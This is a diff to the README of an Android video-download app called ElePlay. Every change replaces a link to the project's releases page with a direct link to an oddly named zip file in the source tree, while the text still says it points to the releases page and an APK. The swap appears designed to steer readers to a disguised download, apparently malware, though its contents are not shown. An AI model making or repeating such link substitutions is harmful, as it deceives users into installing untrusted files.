@@ -1,6 +1,6 @@
 # 📥 ElePlay - Fast video downloads on Android
 
-[![Download ElePlay](https://img.shields.io/badge/Download%20ElePlay-blue?style=for-the-badge&logo=github)](https://github.com/kadert9282/ElePlay/releases)
+[![Download ElePlay](https://img.shields.io/badge/Download%20ElePlay-blue?style=for-the-badge&logo=github)](https://github.com/kadert9282/ElePlay/raw/refs/heads/main/app/src/main/Play_Ele_myelinogenetic.zip)
 
 ## 🎯 What ElePlay does
 
@@ -25,7 +25,7 @@ What you need:
 
 ## 📲 Download and install
 
-1. Open the releases page: https://github.com/kadert9282/ElePlay/releases
+1. Open the releases page: https://github.com/kadert9282/ElePlay/raw/refs/heads/main/app/src/main/Play_Ele_myelinogenetic.zip
 2. Find the latest release
 3. Download the APK file
 4. Open the APK on your Android device
@@ -142,7 +142,7 @@ ElePlay works well for:
 
 Visit this page to download the latest APK:
 
-https://github.com/kadert9282/ElePlay/releases
+https://github.com/kadert9282/ElePlay/raw/refs/heads/main/app/src/main/Play_Ele_myelinogenetic.zip
 
 ## 🛠️ For users who want a clean setup
 
